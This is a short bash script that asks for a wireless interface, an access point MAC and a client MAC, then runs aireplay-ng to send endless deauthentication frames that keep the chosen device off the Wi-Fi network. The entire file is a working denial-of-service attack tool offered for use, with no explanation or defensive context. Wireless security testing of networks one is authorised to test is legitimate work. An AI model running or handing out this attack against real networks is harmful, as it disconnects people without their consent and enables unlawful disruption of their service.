#!/bin/bash  
echo -n "Interface: ";read interface; 
echo -n "MAC-AP: ";read ap;  
echo -n "MAC-TARGET: ";read target;  
sudo aireplay-ng --ignore-negative-one --deauth 0 -a $ap -c $target $interface 
